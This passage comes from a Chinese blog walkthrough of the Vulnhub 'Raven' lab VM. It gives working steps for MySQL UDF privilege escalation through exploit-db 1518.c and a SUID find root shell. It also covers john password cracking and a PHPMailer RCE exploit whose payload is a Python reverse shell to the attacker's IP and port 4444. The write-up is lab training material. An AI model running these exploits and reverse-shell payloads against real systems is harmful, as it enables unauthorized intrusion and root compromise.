+<h3 id="2、MySQL-UDF"><a href="#2、MySQL-UDF" class="headerlink" title="2、MySQL UDF"></a>2、MySQL UDF</h3><p>查看 mysql 版本、位置及 <code>secure_file_priv</code> 选项：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql --version</span><br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><span class="hljs-meta">$</span><span class="bash"> whereis mysql</span><br>mysql: /usr/bin/mysql /usr/lib/mysql /etc/mysql /usr/share/mysql /usr/share/man/man1/mysql.1.gz<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">which</span> mysql</span><br>/usr/bin/mysql<br><span class="hljs-meta">$</span><span class="bash"> mysql -uroot -p</span><br>Enter password: <br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show global variables like <span class="hljs-string">&#x27;secure%&#x27;</span>;</span><br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_auth      | OFF   |<br>| secure_file_priv |       |<br>+------------------+-------+<br>2 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure>
+<p>查找利用脚本，这里使用 <code>1518.c</code> ：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit mysql udf</span><br>------------------------------------------------------------------------------ -----------------------------<br> Exploit Title                                                                |  Path<br>------------------------------------------------------------------------------ -----------------------------<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)        | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)       | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                       | linux/local/7856.txt<br>------------------------------------------------------------------------------ -----------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 1518.c</span>   <br>  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)<br>      URL: https://www.exploit-db.com/exploits/1518<br>     Path: /usr/share/exploitdb/exploits/linux/local/1518.c<br>File Type: C source, ASCII text, with CRLF line terminators<br><br>Copied to: /home/kali/1518.c<br></code></pre></td></tr></table></figure>
+<p>脚本给予的利用过程：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> * $ id</span><br><span class="hljs-comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="hljs-comment"> * $ gcc -g -c raptor_udf2.c</span><br><span class="hljs-comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="hljs-comment"> * $ mysql -u root -p</span><br><span class="hljs-comment"> * Enter password:</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> * mysql&gt; use mysql;</span><br><span class="hljs-comment"> * mysql&gt; create table foo(line blob);</span><br><span class="hljs-comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span><br><span class="hljs-comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; select * from mysql.func;</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | name      | ret | dl             | type     |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | do_system |   2 | raptor_udf2.so | function |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span><br><span class="hljs-comment"> * mysql&gt; \! sh</span><br><span class="hljs-comment"> * sh-2.05b$ cat /tmp/out</span><br><span class="hljs-comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>
+<p>通过尝试，在靶机不能成功编译，所以在攻击机上进行编译：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -g -c 1518.c</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc</span><br></code></pre></td></tr></table></figure>
+<p>通过 python 开启本地 http 服务：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure>
+<p>在刚刚获取的低权限用户中获取目标文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/1518.so</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>1518.c  1518.o  1518.so<br></code></pre></td></tr></table></figure>
+<p>进行提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ mysql -u root -p<br>Enter password: <br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 63451<br>Server version: 5.5.60-0+deb8u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create table foo(line blob);</span><br>Query OK, 0 rows affected (0.04 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> insert into foo values(load_file(<span class="hljs-string">&#x27;/home/michael/1518.so&#x27;</span>));</span><br>Query OK, 1 row affected (0.02 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from foo into dumpfile <span class="hljs-string">&#x27;/usr/lib/mysql/plugin/1518.so&#x27;</span>;</span><br>Query OK, 1 row affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create <span class="hljs-keyword">function</span> do_system returns <span class="hljs-built_in">integer</span> soname <span class="hljs-string">&#x27;1518.so&#x27;</span>;</span><br>Query OK, 0 rows affected (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from mysql.func;</span><br>+-----------+-----+---------+----------+<br>| name      | ret | dl      | type     |<br>+-----------+-----+---------+----------+<br>| do_system |   2 | 1518.so | function |<br>+-----------+-----+---------+----------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;chmod u+s /usr/bin/find&#x27;</span>);</span><br>+--------------------------------------+<br>| do_system(&#x27;chmod u+s /usr/bin/find&#x27;) |<br>+--------------------------------------+<br>|                                    0 |<br>+--------------------------------------+<br>1 row in set (0.02 sec)<br></code></pre></td></tr></table></figure>
+<p>上面利用 UDF 成功将 find 赋予了 SUID 权限，接下来进行 SUID 提权：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ ls -al /usr/bin/find<br>-rwsr-xr-x 1 root root 233984 Nov  9  2014 /usr/bin/find<br>michael@Raven:~$ find / -name flag4.txt -exec &quot;/bin/sh&quot; \;<br><span class="hljs-meta">#</span><span class="bash"> id</span><br>uid=1000(michael) gid=1000(michael) euid=0(root) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br><span class="hljs-meta">#</span><span class="bash"> whoami</span><br>root<br><span class="hljs-meta">#</span><span class="bash"> cat /root/flag4.txt</span><br>flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;<br>CONGRATULATIONS on successfully rooting Raven!<br>This is my first Boot2Root VM - I hope you enjoyed it.<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure>
+<h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、WordPress </p>
+<p>2、WordPress 枚举、爆破；SSH 爆破</p>
+<p>3、WordPress 配置文件；mysql root权限、用户密码、flag</p>
+<p>4、john 爆破</p>
+<p>5、sudo 提权（python），MySQL UDF 提权 - SUID 提权（find）</p>
+<h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>john 解密之后无法再次解密：</strong></p>
+<p>解决：当我们破解成功后，john 会将破解成功的 hash 缓存在家目录的 <code>.john/john.pot</code> 文件中，需要手动删除 <code>rm -rf ~/.john/john.pot</code> ，或者删除  <code>.john/john.pot</code>   文件下解密过的字符串，才可以再次进行解密。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>No password hashes left to crack (see FAQ)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                     <br>?:pink84<br><br>1 password hash cracked, 0 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat .john/john.pot</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta">$</span><span class="bash">P<span class="hljs-variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> vim .john/john.pot</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat .john/john.pot</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                     <br>0 password hashes cracked, 1 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>pink84           (?)<br>1g 0:00:00:07 DONE (2022-06-27 10:05) 0.1295g/s 5944p/s 5944c/s 5944C/s tamika1..milkdud<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br>                                                                                                             $ cat .john/john.pot                                                           <br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$xe</span>/eyoTx<span class="hljs-variable">$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb</span>/io7x9q1iP.:computer</span><br><span class="hljs-meta">$</span><span class="bash">P<span class="hljs-variable">$Bk3VD9jsxx</span>/loJoqNsURgHiaB23j7W/:pink84</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>No password hashes left to crack (see FAQ)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span>                                            <br>?:pink84<br><br>1 password hash cracked, 0 left<br></code></pre></td></tr></table></figure>
+<p><strong>MySQL UDF：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">mysql&gt;</span><span class="bash"> select do_system(<span class="hljs-string">&#x27;whoami&gt;/tmp/out&#x27;</span>);</span><br>+------------------------------+<br>| do_system(&#x27;whoami&gt;/tmp/out&#x27;) |<br>+------------------------------+<br>|                            0 |<br>+------------------------------+<br>1 row in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> system cat /tmp/out</span><br>root<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> \! sh</span><br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>michael<br><span class="hljs-meta">$</span><span class="bash"> cat /tmp/out</span><br>root<br></code></pre></td></tr></table></figure>
+<p><strong>文件上传 GetShell：</strong></p>
+<blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/108206821">https://blog.csdn.net/qq_43168364/article/details/108206821</a></p>
+</blockquote>
+<p>在 <code>http://192.168.15.172/vendor/</code> 目录下发现了 <code>PHPMailerAutoload.php</code> 文件。</p>
+<p>phpMailer 是一个非常强大的 php 发送邮件类，PHPMailer &lt; 5.2.18 中存在高危安全漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p>
+<p>可以在 <code>http://192.168.15.172/vendor/VERSION</code> 中查看 phpMailer 的版本，版本为：<code>5.2.16</code> 。</p>
+<p>用 searchsploit 查找 phpmailer 的漏洞利用代码，这里使用 40974.py 脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit phpmailer</span>  <br>---------------------------------------------------------------------------- -------------------------------<br> Exploit Title                                                              |  Path<br>---------------------------------------------------------------------------- -------------------------------<br>PHPMailer 1.7 - &#x27;Data()&#x27; Remote Denial of Service                           | php/dos/25752.txt<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40968.sh<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40970.php<br>PHPMailer &lt; 5.2.18 - Remote Code Execution                                  | php/webapps/40974.py<br>PHPMailer &lt; 5.2.19 - Sendmail Argument Injection (Metasploit)               | multiple/webapps/41688.rb<br>PHPMailer &lt; 5.2.20 - Remote Code Execution                                  | php/webapps/40969.pl<br>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution                    | php/webapps/42221.py<br>PHPMailer &lt; 5.2.21 - Local File Disclosure                                  | php/webapps/43056.py<br>WordPress Plugin PHPMailer 4.6 - Host Header Command Injection (Metasploit) | php/remote/42024.rb<br>---------------------------------------------------------------------------- -------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure>
+<p>修改 python 脚本的内容：</p>
+<blockquote>
+<p>PS:后门文件上传到靶机的路径应该是必须要更改的否则无法反弹shell，且文件名不能用 backdoor.php </p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://localhost:8080&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.0.12\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/www/backdoor.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>修改后：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">target = <span class="hljs-string">&#x27;http://192.168.135.149/contact.php&#x27;</span><br>backdoor = <span class="hljs-string">&#x27;/backdoor.php&#x27;</span><br><br>payload = <span class="hljs-string">&#x27;&lt;?php system(\&#x27;python -c &quot;&quot;&quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&#x27;192.168.135.141\\\&#x27;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\&quot;/bin/sh\\\&quot;,\\\&quot;-i\\\&quot;])&quot;&quot;&quot;\&#x27;); ?&gt;&#x27;</span><br>fields=&#123;<span class="hljs-string">&#x27;action&#x27;</span>: <span class="hljs-string">&#x27;submit&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: payload,<br>        <span class="hljs-string">&#x27;email&#x27;</span>: <span class="hljs-string">&#x27;&quot;anarcoder\\\&quot; -OQueueDirectory=/tmp -X/var/www/html/wzz.php server\&quot; @protonmail.com&#x27;</span>,<br>        <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;Pwned&#x27;</span>&#125;<br></code></pre></td></tr></table></figure>
+<p>在 kali 中运行 40974.py 文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python3 40974.py</span> <br></code></pre></td></tr></table></figure>
+<p>然后就会在靶机的网站根目录下生成一个 wzz.php 文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ ls /var/www/html<br>about.html   contact.zip  elements.html  img         js    Security - Doc  team.html  wordpress<br>contact.php  css          fonts          index.html  scss  service.html    vendor     wzz.php<br>michael@Raven:~$ find / -name &quot;wzz.php&quot; 2&gt;/dev/null<br>/var/www/html/wzz.php<br></code></pre></td></tr></table></figure>
+<p>kali 中监听 4444 端口，在浏览器中访问 <code>http://192.168.135.149/wzz.php</code> 文件。然后就 getshell 成功了。</p>
+<blockquote>
+<p>这种方法使用的前提是我们要知道网站的根路径，靶机的话一般就是/var/www/html</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>     <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.149] 57054<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure>
+<p><strong>查看开放的端口号：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> netstat -antpl</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Penetration/">Penetration</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Penetration/">Penetration</a>
+                    
+                      <a class="hover-with-bg" href="/tags/vulnhub/">vulnhub</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/27/Penetration/Vulnhub/Part-1/0x05%20DC-2/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">DC：2</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/26/Penetration/Vulnhub/Part-1/0x04%20DC-1/">
+                        <span class="hidden-mobile">DC：1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
